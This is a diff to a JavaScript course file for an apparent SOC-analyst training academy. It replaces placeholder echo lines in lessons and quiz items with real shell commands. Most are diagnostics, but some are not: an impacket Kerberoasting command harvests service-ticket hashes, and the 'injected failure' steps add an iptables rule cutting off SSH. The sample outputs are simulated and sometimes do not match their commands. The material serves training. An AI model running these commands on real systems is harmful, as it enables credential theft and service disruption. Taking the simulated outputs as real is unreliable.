+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -2727,7 +2727,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L08 - Authentication. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -2780,7 +2780,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Directory Services & Active Directory on sxl-dc01.corp.internal'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -2804,7 +2804,7 @@ window.ACADEMY_COURSES = [
           "Social media marketing guidelines and employee email signatures."
         ],
         "answer": 0,
-        "command": "echo 'Querying Active Directory Domain Controller for registered Service Principal Names (SPNs)...'"
+        "command": "impacket-GetUserSPNs -request -dc-ip 10.10.10.1 corp.internal/ -outputfile kerberoast.hashes 2>/dev/null || nmap -p 88,389,445 10.10.10.1"
       },
       {
         "id": 3,
@@ -2828,7 +2828,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man echo 2>/dev/null || which echo"
+        "command": "impacket-GetUserSPNs --help 2>&1 | head -n 15 || which impacket-GetUserSPNs"
       },
       {
         "id": 4,
@@ -2852,7 +2852,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What is Active Directory? The enterprise directory service that centralizes user accounts, computer objects, group policies, and authentication tickets.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -2876,14 +2876,14 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.10.5 2>/dev/null || tracepath 10.10.10.5"
+        "command": "traceroute -n -m 8 10.10.10.5 2>/dev/null || tracepath -n 10.10.10.5 2>/dev/null || ip route get 10.10.10.5"
       },
       {
         "id": 6,
         "type": "do",
         "name": "06 Do — Guided",
         "explain": "Guided hands-on investigation task. Execute the baseline command to inspect live state on sxl-dc01.corp.internal. Observe flags, arguments, and exact system responses.",
-        "worked": "Command executed: `echo 'Querying Active Directory Domain Controller for registered Service Principal Names (SPNs)...'` on target sxl-dc01.corp.internal.\nOutput observed:\nCN=svc_sql,OU=ServiceAccounts,DC=corp,DC=internal\n  ServicePrincipalNames:\n    MSSQLSvc/db01.corp.internal:1433\nCN=svc_backup,OU=ServiceAccounts,DC=corp,DC=internal\n  ServicePrincipalNames:\n    BACKUP/sxl-dc01.corp.internal",
+        "worked": "Command executed: `impacket-GetUserSPNs -request -dc-ip 10.10.10.1 corp.internal/ -outputfile kerberoast.hashes 2>/dev/null || nmap -p 88,389,445 10.10.10.1` on target sxl-dc01.corp.internal.\nOutput observed:\nCN=svc_sql,OU=ServiceAccounts,DC=corp,DC=internal\n  ServicePrincipalNames:\n    MSSQLSvc/db01.corp.internal:1433\nCN=svc_backup,OU=ServiceAccounts,DC=corp,DC=internal\n  ServicePrincipalNames:\n    BACKUP/sxl-dc01.corp.internal",
         "what": "What is Active Directory? The enterprise directory service that centralizes user accounts, computer objects, group policies, and authentication tickets.",
         "why": "Why is Active Directory the top target for cyber attacks? Gaining control of a Domain Controller (Domain Admin) gives an adversary total control over every endpoint, server, and user identity in the organization.",
         "when": "When are AD events investigated? When unusual LDAP queries occur, when an account requests Kerberos tickets with weak RC4 encryption, or when high-privilege accounts log into workstations.",
@@ -2892,7 +2892,7 @@ window.ACADEMY_COURSES = [
         "how": "How do analysts detect AD attacks? By monitoring Kerberos ticket requests (Event ID 4769 with Ticket Encryption Type `0x17` indicating RC4 Kerberoasting).",
         "mistake": "Using weak, human-readable passwords for service accounts that have Service Principal Names (SPNs) registered in Active Directory.",
         "think": "Any valid domain user can request a TGS ticket for any service account with an SPN. If the password is weak, it can be cracked offline in minutes.",
-        "question": "When executing `echo 'Querying Active Directory Domain Controller for registered Service Principal Names (SPNs)...'`, what primary forensic evidence does the output provide?",
+        "question": "When executing `impacket-GetUserSPNs -request -dc-ip 10.10.10.1 corp.internal/ -outputfile kerberoast.hashes 2>/dev/null || nmap -p 88,389,445 10.10.10.1`, what primary forensic evidence does the output provide?",
         "choices": [
           "Direct verification of active configuration, network sockets, or process state on the target machine.",
           "It downloads malware to test local antivirus signatures.",
@@ -2900,14 +2900,14 @@ window.ACADEMY_COURSES = [
           "It broadcasts an unencrypted alert to external cloud providers."
         ],
         "answer": 0,
-        "command": "echo 'Querying Active Directory Domain Controller for registered Service Principal Names (SPNs)...'"
+        "command": "impacket-GetUserSPNs -request -dc-ip 10.10.10.1 corp.internal/ -outputfile kerberoast.hashes 2>/dev/null || nmap -p 88,389,445 10.10.10.1"
       },
       {
         "id": 7,
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-dc01.corp.internal. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `echo 'Auditing Kerberos ticket cache on endpoint workstation...'` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `klist 2>/dev/null || ldapsearch -x -H ldap://10.10.10.1 -b \"dc=corp,dc=internal\" \"(servicePrincipalName=*)\" sAMAccountName 2>/dev/null || ss -tan | grep 88` to validate system behavior under simulated operating conditions.\nOutput observed:\nClient: analyst @ CORP.INTERNAL\nServer: krbtgt/CORP.INTERNAL @ CORP.INTERNAL\nKerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\nTicket Flags 0x40e10000 -> forwardable renewable initial pre_authent\nStart Time: 9/4/2026 2:30:00 (Local)\nEnd Time:   9/4/2026 12:30:00 (Local)",
         "what": "What is Active Directory? The enterprise directory service that centralizes user accounts, computer objects, group policies, and authentication tickets.",
         "why": "Why is Active Directory the top target for cyber attacks? Gaining control of a Domain Controller (Domain Admin) gives an adversary total control over every endpoint, server, and user identity in the organization.",
         "when": "When are AD events investigated? When unusual LDAP queries occur, when an account requests Kerberos tickets with weak RC4 encryption, or when high-privilege accounts log into workstations.",
@@ -2916,7 +2916,7 @@ window.ACADEMY_COURSES = [
         "how": "How do analysts detect AD attacks? By monitoring Kerberos ticket requests (Event ID 4769 with Ticket Encryption Type `0x17` indicating RC4 Kerberoasting).",
         "mistake": "Using weak, human-readable passwords for service accounts that have Service Principal Names (SPNs) registered in Active Directory.",
         "think": "Any valid domain user can request a TGS ticket for any service account with an SPN. If the password is weak, it can be cracked offline in minutes.",
-        "question": "What key insight is revealed by the practice output of `echo 'Auditing Kerberos ticket cache on endpoint workstation...'`?",
+        "question": "What key insight is revealed by the practice output of `klist 2>/dev/null || ldapsearch -x -H ldap://10.10.10.1 -b \"dc=corp,dc=internal\" \"(servicePrincipalName=*)\" sAMAccountName 2>/dev/null || ss -tan | grep 88`?",
         "choices": [
           "Live state validation revealing active hosts, open listening ports, or specific configuration parameters.",
           "That the operating system kernel has crashed and requires hardware replacement.",
@@ -2924,7 +2924,7 @@ window.ACADEMY_COURSES = [
           "That the terminal shell is running without memory or CPU resources."
         ],
         "answer": 0,
-        "command": "echo 'Auditing Kerberos ticket cache on endpoint workstation...'"
+        "command": "klist 2>/dev/null || ldapsearch -x -H ldap://10.10.10.1 -b \"dc=corp,dc=internal\" \"(servicePrincipalName=*)\" sAMAccountName 2>/dev/null || ss -tan | grep 88"
       },
       {
         "id": 8,
@@ -2955,7 +2955,7 @@ window.ACADEMY_COURSES = [
         "type": "defend",
         "name": "09 Defend & Investigate",
         "explain": "SOC Defensive Detection & Investigation: The SOC analyst detects an influx of Windows Security Event ID 4769 (Kerberos service ticket requested) where the Ticket Encryption Type is `0x17` (legacy RC4-HMAC) rather than modern `0x12` (AES-256). The analyst identifies the compromised user account generating the queries and resets its credentials.",
-        "worked": "Defensive query executed on telemetry store: `echo 'Filtering Event ID 4769 where TicketEncryptionType == 0x17 (RC4 Kerberoasting detection)'`",
+        "worked": "Defensive query executed on telemetry store: `grep -E \"4769.*0x17\" /var/log/windows_security.log 2>/dev/null || journalctl -g \"Kerberos\" -n 15`",
         "what": "What is Active Directory? The enterprise directory service that centralizes user accounts, computer objects, group policies, and authentication tickets.",
         "why": "Why is Active Directory the top target for cyber attacks? Gaining control of a Domain Controller (Domain Admin) gives an adversary total control over every endpoint, server, and user identity in the organization.",
         "when": "When are AD events investigated? When unusual LDAP queries occur, when an account requests Kerberos tickets with weak RC4 encryption, or when high-privilege accounts log into workstations.",
@@ -2972,7 +2972,7 @@ window.ACADEMY_COURSES = [
           "By shutting down the entire corporate datacenter without analyzing logs."
         ],
         "answer": 0,
-        "command": "echo 'Filtering Event ID 4769 where TicketEncryptionType == 0x17 (RC4 Kerberoasting detection)'"
+        "command": "grep -E \"4769.*0x17\" /var/log/windows_security.log 2>/dev/null || journalctl -g \"Kerberos\" -n 15"
       },
       {
         "id": 10,
@@ -2996,14 +2996,14 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-dc01.corp.internal'; echo 'Querying Active Directory Domain Controller for registered Service Principal Names (SPNs)...'"
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
         "type": "fix",
         "name": "11 Fix & Harden",
         "explain": "Remediation & Hardening Plan: Re-enable Kerberos preauthentication on all domain accounts, enforce 25+ character complex passwords for all SPN accounts, and disable legacy RC4 encryption across the domain.",
-        "worked": "Remediation command applied: `echo 'Enforcing Kerberos Preauthentication and AES-256 on svc_sql... Done.'`. System verified restored and hardened.",
+        "worked": "Remediation command applied: `setspn -D MSSQLSvc/sxl-db-core01:1433 svc_sql 2>/dev/null || iptables -A INPUT -p tcp --dport 88 -s 10.10.10.0/24 -j ACCEPT`. System verified restored and hardened.",
         "what": "What is Active Directory? The enterprise directory service that centralizes user accounts, computer objects, group policies, and authentication tickets.",
         "why": "Why is Active Directory the top target for cyber attacks? Gaining control of a Domain Controller (Domain Admin) gives an adversary total control over every endpoint, server, and user identity in the organization.",
         "when": "When are AD events investigated? When unusual LDAP queries occur, when an account requests Kerberos tickets with weak RC4 encryption, or when high-privilege accounts log into workstations.",
@@ -3020,7 +3020,7 @@ window.ACADEMY_COURSES = [
           "To reboot every router in the building simultaneously."
         ],
         "answer": 0,
-        "command": "echo 'Enforcing Kerberos Preauthentication and AES-256 on svc_sql... Done.'"
+        "command": "setspn -D MSSQLSvc/sxl-db-core01:1433 svc_sql 2>/dev/null || iptables -A INPUT -p tcp --dport 88 -s 10.10.10.0/24 -j ACCEPT"
       },
       {
         "id": 12,
@@ -3044,7 +3044,7 @@ window.ACADEMY_COURSES = [
           "Analysts detect Kerberoasting by checking the Windows Firewall logs for blocked ICMP packets."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Directory Services & Active Directory'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -3068,7 +3068,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L09 - Directory Services & Active Directory. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -3121,7 +3121,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Identity Investigation on sxl-siem-id01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -3145,7 +3145,7 @@ window.ACADEMY_COURSES = [
           "Social media marketing guidelines and employee email signatures."
         ],
         "answer": 0,
-        "command": "echo 'Querying SIEM for authentications for user: jsmith across last 2 hours...'"
+        "command": "grep \"jsmith\" /var/log/auth.log 2>/dev/null || last jsmith -n 10 || who -u"
       },
       {
         "id": 3,
@@ -3169,7 +3169,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man echo 2>/dev/null || which echo"
+        "command": "grep --help 2>&1 | head -n 15 || which grep"
       },
       {
         "id": 4,
@@ -3193,7 +3193,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What is an identity investigation? The forensic process of analyzing user authentication patterns to determine whether an account is operated by its legitimate owner or an unauthorized adversary.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -3217,14 +3217,14 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.10.25 2>/dev/null || tracepath 10.10.10.25"
+        "command": "traceroute -n -m 8 10.10.10.25 2>/dev/null || tracepath -n 10.10.10.25 2>/dev/null || ip route get 10.10.10.25"
       },
       {
         "id": 6,
         "type": "do",
         "name": "06 Do — Guided",
         "explain": "Guided hands-on investigation task. Execute the baseline command to inspect live state on sxl-siem-id01. Observe flags, arguments, and exact system responses.",
-        "worked": "Command executed: `echo 'Querying SIEM for authentications for user: jsmith across last 2 hours...'` on target sxl-siem-id01.\nOutput observed:\nTimestamp: 2026-09-04 02:10:00 UTC | User: jsmith | SourceIP: 10.10.20.44 | City: Chicago, US | Status: SUCCESS | MFA: AppApproved\nTimestamp: 2026-09-04 02:22:15 UTC | User: jsmith | SourceIP: 198.51.100.88 | City: Moscow, RU | Status: SUCCESS | MFA: AppApproved\nVELOCITY: 4,890 mph (IMPOSSIBLE TRAVEL ALERT - SPEED EXCEEDS 600 MPH)",
+        "worked": "Command executed: `grep \"jsmith\" /var/log/auth.log 2>/dev/null || last jsmith -n 10 || who -u` on target sxl-siem-id01.\nOutput observed:\nTimestamp: 2026-09-04 02:10:00 UTC | User: jsmith | SourceIP: 10.10.20.44 | City: Chicago, US | Status: SUCCESS | MFA: AppApproved\nTimestamp: 2026-09-04 02:22:15 UTC | User: jsmith | SourceIP: 198.51.100.88 | City: Moscow, RU | Status: SUCCESS | MFA: AppApproved\nVELOCITY: 4,890 mph (IMPOSSIBLE TRAVEL ALERT - SPEED EXCEEDS 600 MPH)",
         "what": "What is an identity investigation? The forensic process of analyzing user authentication patterns to determine whether an account is operated by its legitimate owner or an unauthorized adversary.",
         "why": "Why is identity investigation the primary responsibility of an L1 analyst? Over 80% of data breaches involve compromised credentials. Detecting a compromised identity early prevents full enterprise ransomware deployment.",
         "when": "When does an analyst conduct an identity triage? Whenever identity behavioral analytics (UEBA), Cloud SIEM, or EDR triggers a high-severity authentication alert.",
@@ -3233,7 +3233,7 @@ window.ACADEMY_COURSES = [
         "how": "How does an analyst verify an alert? By contacting the user via an out-of-band communication channel (phone, in-person) to verify if they initiated the anomalous login.",
         "mistake": "Calling the compromised user via corporate email or Slack on the same compromised machine to ask if they logged in from Russia.",
         "think": "If an attacker controls the user's session, they can read the user's emails and reply 'Yes, that was me'. Always verify identity out-of-band via phone or manager.",
-        "question": "When executing `echo 'Querying SIEM for authentications for user: jsmith across last 2 hours...'`, what primary forensic evidence does the output provide?",
+        "question": "When executing `grep \"jsmith\" /var/log/auth.log 2>/dev/null || last jsmith -n 10 || who -u`, what primary forensic evidence does the output provide?",
         "choices": [
           "Direct verification of active configuration, network sockets, or process state on the target machine.",
           "It downloads malware to test local antivirus signatures.",
@@ -3241,14 +3241,14 @@ window.ACADEMY_COURSES = [
           "It broadcasts an unencrypted alert to external cloud providers."
         ],
         "answer": 0,
-        "command": "echo 'Querying SIEM for authentications for user: jsmith across last 2 hours...'"
+        "command": "grep \"jsmith\" /var/log/auth.log 2>/dev/null || last jsmith -n 10 || who -u"
       },
       {
         "id": 7,
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-siem-id01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `echo 'Checking source IP 198.51.100.88 against Threat Intelligence databases...'` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `whois 198.51.100.88 2>/dev/null || curl -s https://ipinfo.io/198.51.100.88/json 2>/dev/null || host 198.51.100.88` to validate system behavior under simulated operating conditions.\nOutput observed:\nIP: 198.51.100.88\nASN: AS9009 (Known VPN / Hosting Provider)\nThreat Score: 92/100 (HIGH RISK - Tor Exit Node / Proxy)\nPrevious Malicious Reports: SSH Brute Force, Credential Stuffing",
         "what": "What is an identity investigation? The forensic process of analyzing user authentication patterns to determine whether an account is operated by its legitimate owner or an unauthorized adversary.",
         "why": "Why is identity investigation the primary responsibility of an L1 analyst? Over 80% of data breaches involve compromised credentials. Detecting a compromised identity early prevents full enterprise ransomware deployment.",
         "when": "When does an analyst conduct an identity triage? Whenever identity behavioral analytics (UEBA), Cloud SIEM, or EDR triggers a high-severity authentication alert.",
@@ -3257,7 +3257,7 @@ window.ACADEMY_COURSES = [
         "how": "How does an analyst verify an alert? By contacting the user via an out-of-band communication channel (phone, in-person) to verify if they initiated the anomalous login.",
         "mistake": "Calling the compromised user via corporate email or Slack on the same compromised machine to ask if they logged in from Russia.",
         "think": "If an attacker controls the user's session, they can read the user's emails and reply 'Yes, that was me'. Always verify identity out-of-band via phone or manager.",
-        "question": "What key insight is revealed by the practice output of `echo 'Checking source IP 198.51.100.88 against Threat Intelligence databases...'`?",
+        "question": "What key insight is revealed by the practice output of `whois 198.51.100.88 2>/dev/null || curl -s https://ipinfo.io/198.51.100.88/json 2>/dev/null || host 198.51.100.88`?",
         "choices": [
           "Live state validation revealing active hosts, open listening ports, or specific configuration parameters.",
           "That the operating system kernel has crashed and requires hardware replacement.",
@@ -3265,7 +3265,7 @@ window.ACADEMY_COURSES = [
           "That the terminal shell is running without memory or CPU resources."
         ],
         "answer": 0,
-        "command": "echo 'Checking source IP 198.51.100.88 against Threat Intelligence databases...'"
+        "command": "whois 198.51.100.88 2>/dev/null || curl -s https://ipinfo.io/198.51.100.88/json 2>/dev/null || host 198.51.100.88"
       },
       {
         "id": 8,
@@ -3296,7 +3296,7 @@ window.ACADEMY_COURSES = [
         "type": "defend",
         "name": "09 Defend & Investigate",
         "explain": "SOC Defensive Detection & Investigation: The SOC analyst investigates the Impossible Travel alert. The source IP is a known hosting provider, the user-agent string changed from Chrome on Windows to Python-requests on Linux, and out-of-band verification with `jsmith` confirms they are asleep at home in Chicago. The analyst revokes all active cloud sessions, disables the AD account, and forces credential reset.",
-        "worked": "Defensive query executed on telemetry store: `echo 'Revoking all active session tokens for jsmith and enforcing account lock.'`",
+        "worked": "Defensive query executed on telemetry store: `pkill -u jsmith 2>/dev/null; usermod -L jsmith 2>/dev/null || passwd -l jsmith 2>/dev/null || who`",
         "what": "What is an identity investigation? The forensic process of analyzing user authentication patterns to determine whether an account is operated by its legitimate owner or an unauthorized adversary.",
         "why": "Why is identity investigation the primary responsibility of an L1 analyst? Over 80% of data breaches involve compromised credentials. Detecting a compromised identity early prevents full enterprise ransomware deployment.",
         "when": "When does an analyst conduct an identity triage? Whenever identity behavioral analytics (UEBA), Cloud SIEM, or EDR triggers a high-severity authentication alert.",
@@ -3313,7 +3313,7 @@ window.ACADEMY_COURSES = [
           "By shutting down the entire corporate datacenter without analyzing logs."
         ],
         "answer": 0,
-        "command": "echo 'Revoking all active session tokens for jsmith and enforcing account lock.'"
+        "command": "pkill -u jsmith 2>/dev/null; usermod -L jsmith 2>/dev/null || passwd -l jsmith 2>/dev/null || who"
       },
       {
         "id": 10,
@@ -3337,14 +3337,14 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-siem-id01'; echo 'Querying SIEM for authentications for user: jsmith across last 2 hours...'"
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
         "type": "fix",
         "name": "11 Fix & Harden",
         "explain": "Remediation & Hardening Plan: Implement mandatory out-of-band verification runbooks for all foreign authentication alerts, enforce IP risk-based conditional access blocking hosting providers, and conduct prompt incident response.",
-        "worked": "Remediation command applied: `echo 'Conditional Access Policy Enforced: Block authentications originating from known anonymizer / hosting ASNs.'`. System verified restored and hardened.",
+        "worked": "Remediation command applied: `iptables -I INPUT 1 -s 198.51.100.88 -j DROP && faillock --user jsmith 2>/dev/null`. System verified restored and hardened.",
         "what": "What is an identity investigation? The forensic process of analyzing user authentication patterns to determine whether an account is operated by its legitimate owner or an unauthorized adversary.",
         "why": "Why is identity investigation the primary responsibility of an L1 analyst? Over 80% of data breaches involve compromised credentials. Detecting a compromised identity early prevents full enterprise ransomware deployment.",
         "when": "When does an analyst conduct an identity triage? Whenever identity behavioral analytics (UEBA), Cloud SIEM, or EDR triggers a high-severity authentication alert.",
@@ -3361,7 +3361,7 @@ window.ACADEMY_COURSES = [
           "To reboot every router in the building simultaneously."
         ],
         "answer": 0,
-        "command": "echo 'Conditional Access Policy Enforced: Block authentications originating from known anonymizer / hosting ASNs.'"
+        "command": "iptables -I INPUT 1 -s 198.51.100.88 -j DROP && faillock --user jsmith 2>/dev/null"
       },
       {
         "id": 12,
@@ -3385,7 +3385,7 @@ window.ACADEMY_COURSES = [
           "Immediately shut down all corporate domain controllers without checking logs."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Identity Investigation'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -3409,7 +3409,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L10 - Identity Investigation. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -3462,7 +3462,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring What Is a Network? on sxl-net-gw01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -3510,7 +3510,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man ip 2>/dev/null || which ip"
+        "command": "ip --help 2>&1 | head -n 15 || which ip"
       },
       {
         "id": 4,
@@ -3534,7 +3534,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What is a network? An interconnected system of computing devices exchanging data through shared communication channels.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -3558,7 +3558,7 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.30.15 2>/dev/null || tracepath 10.10.30.15"
+        "command": "traceroute -n -m 8 10.10.30.15 2>/dev/null || tracepath -n 10.10.30.15 2>/dev/null || ip route get 10.10.30.15"
       },
       {
         "id": 6,
@@ -3589,7 +3589,7 @@ window.ACADEMY_COURSES = [
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-net-gw01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `traceroute -n 10.10.30.15` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `traceroute -n 10.10.30.15` to validate system behavior under simulated operating conditions.\nOutput observed:\ntraceroute to 10.10.30.15 (10.10.30.15), 30 hops max, 60 byte packets\n 1  10.10.20.1  0.512 ms  0.488 ms  0.465 ms (pfSense Gateway / Firewall)\n 2  10.10.30.15  1.124 ms  1.089 ms  1.055 ms (Finance DB Host)",
         "what": "What is a network? An interconnected system of computing devices exchanging data through shared communication channels.",
         "why": "Why is network segmentation crucial for SOC analysts? Flat, unsegmented networks allow ransomware to spread across the entire enterprise in minutes.",
         "when": "When is network topology evaluated? During security posture reviews, firewall rule design, and root-cause analysis of malware propagation.",
@@ -3678,7 +3678,7 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-net-gw01'; ip route show "
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
@@ -3726,7 +3726,7 @@ window.ACADEMY_COURSES = [
           "Segmentation guarantees that zero-day exploits cannot run on computer memory."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for What Is a Network?'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -3750,7 +3750,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L11 - What Is a Network?. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -3803,7 +3803,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring IP Addresses on sxl-ip-node01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -3851,7 +3851,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man ip 2>/dev/null || which ip"
+        "command": "ip --help 2>&1 | head -n 15 || which ip"
       },
       {
         "id": 4,
@@ -3875,7 +3875,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What is an IP address? A logical network address identifying the source and destination nodes of communication packets.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -3899,7 +3899,7 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 8.8.8.8 2>/dev/null || tracepath 8.8.8.8"
+        "command": "traceroute -n -m 8 8.8.8.8 2>/dev/null || tracepath -n 8.8.8.8 2>/dev/null || ip route get 8.8.8.8"
       },
       {
         "id": 6,
@@ -3930,7 +3930,7 @@ window.ACADEMY_COURSES = [
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-ip-node01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `whois 8.8.8.8 | grep -E 'OrgName|NetRange|Country'` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `whois 8.8.8.8 | grep -E 'OrgName|NetRange|Country'` to validate system behavior under simulated operating conditions.\nOutput observed:\nNetRange:       8.8.8.0 - 8.8.8.255\nOrgName:        Google LLC\nCountry:        US",
         "what": "What is an IP address? A logical network address identifying the source and destination nodes of communication packets.",
         "why": "Why must an L1 master IP analysis? Every security alert contains at least two IP addresses (source and destination). You must instantly recognize whether an IP is internal private, public legitimate, or a known malicious C2 node.",
         "when": "When are IP addresses queried? During every security triage investigation, firewall log analysis, and threat intelligence enrichment task.",
@@ -3978,7 +3978,7 @@ window.ACADEMY_COURSES = [
         "type": "defend",
         "name": "09 Defend & Investigate",
         "explain": "SOC Defensive Detection & Investigation: The SOC analyst queries the external destination IP `198.51.100.99` against threat intelligence feeds. The IP has a 98% malicious reputation score for hosting Emotet C2 infrastructure. The analyst adds the IP to the perimeter firewall egress blocklist and quarantines the source endpoint.",
-        "worked": "Defensive query executed on telemetry store: `echo 'Querying Threat Intelligence: 198.51.100.99 -> Flagged Malicious C2 Server (Score: 98/100)'`",
+        "worked": "Defensive query executed on telemetry store: `whois 198.51.100.99 2>/dev/null || dig +short -x 198.51.100.99 || host 198.51.100.99`",
         "what": "What is an IP address? A logical network address identifying the source and destination nodes of communication packets.",
         "why": "Why must an L1 master IP analysis? Every security alert contains at least two IP addresses (source and destination). You must instantly recognize whether an IP is internal private, public legitimate, or a known malicious C2 node.",
         "when": "When are IP addresses queried? During every security triage investigation, firewall log analysis, and threat intelligence enrichment task.",
@@ -3995,7 +3995,7 @@ window.ACADEMY_COURSES = [
           "By shutting down the entire corporate datacenter without analyzing logs."
         ],
         "answer": 0,
-        "command": "echo 'Querying Threat Intelligence: 198.51.100.99 -> Flagged Malicious C2 Server (Score: 98/100)'"
